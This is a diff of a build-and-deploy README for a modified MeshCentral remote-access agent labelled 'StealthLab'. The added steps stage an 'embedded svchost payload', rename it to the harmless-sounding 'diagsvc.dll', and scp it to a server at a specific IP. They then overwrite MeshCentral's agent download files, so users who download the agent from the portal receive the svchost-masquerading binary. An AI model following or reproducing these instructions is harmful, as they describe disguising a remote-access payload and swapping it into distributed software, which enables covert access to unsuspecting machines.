@@ -15,6 +15,7 @@ The local build pipeline now handles every step end-to-end:
   - `meshservice\x64\StealthLab\MeshService-2022.exe`
   - `meshservice\StealthLab\MeshService-2022.exe`
 - Packaging scripts (`build_complete.ps1`, `build_all.ps1`) rename artifacts to the production-friendly `diagsvc.dll` and create a ready-to-ship drop folder.
+- `tools\prepare_meshcentral_agent.ps1` runs the StealthLab build, verifies the embedded svchost payload, and stages `MeshService64.exe`, `diagsvc.dll`, provisioning files, and hashes under `dist\meshcentral`.
 
 GitHub Actions remains available for automation, but the on-device workflow is the source of truth and is what the documentation below covers.
 
@@ -73,8 +74,8 @@ Get-FileHash meshservice\embedded\svchost_payload.dll
 
 Outputs a timestamped directory under `dist\package_YYYYMMDD_HHMMSS\` containing:
 
-- `diagsvc.dll` – the svchost payload ready for deployment.
-- `MeshService-2022.exe` (x64 & Win32) – lab executables for direct installs.
+- `diagsvc.dll` - the svchost payload ready for deployment.
+- `MeshService64.exe` (and `MeshService.exe` when built) - svchost-enabled executables for direct overrides.
 - `install.ps1`, `README.txt`, and checksum files for operator hand-off.
 
 ### 2. Manual Artifact Pickup
@@ -93,6 +94,20 @@ To create a `diagsvc.dll` manually:
 Copy-Item meshservice\x64\StealthLab_DLL\MeshService-2022.dll diagsvc.dll
 ```
 
+### 3. MeshCentral override bundle
+
+To stage files exactly as MeshCentral expects (including the executable override), run:
+
+```powershell
+.\tools\prepare_meshcentral_agent.ps1
+```
+
+This produces `dist\meshcentral\` with:
+
+- `MeshService64.exe` (and optionally `MeshService.exe`) – svchost-enabled executables ready to copy into `meshcentral-data\agents\`.
+- `diagsvc.dll`, provisioning `.msh`, branding JSON, and `checksums.txt` for integrity validation.
+- A README summarising deployment steps and hashes.
+
 ---
 
 ## Deploy to MeshCentral
@@ -102,12 +117,13 @@ Copy-Item meshservice\x64\StealthLab_DLL\MeshService-2022.dll diagsvc.dll
    scp dist\package_*\diagsvc.dll root@72.60.233.29:/opt/meshcentral/meshcentral-data/agents-custom/meshagent_win32_x64.exe
    ```
    *If you maintain separate x86/x64 payloads, upload each with the name MeshCentral expects.*
-2. Back up the existing agent binaries before overwriting.
-3. Restart MeshCentral to make the new agent downloadable:
+2. (Optional but recommended) Replace the download executable with `dist\meshcentral\MeshService64.exe` copied to `/opt/meshcentral/meshcentral-data/agents/MeshService64.exe` (and `MeshService.exe` for Win32). This keeps the portal download in sync with the svchost payload.
+3. Back up the existing agent binaries before overwriting.
+4. Restart MeshCentral to make the new agent downloadable:
    ```bash
    sudo systemctl restart meshcentral
    ```
-4. From the MeshCentral portal, download the Windows x64 agent and confirm the timestamp/hash matches the build.
+5. From the MeshCentral portal, download the Windows x64 agent and confirm the timestamp/hash matches the build. Verify the embedded `SVCHOSTDLL` resource with `Test-SvchostPayload`.
 
 ---
 
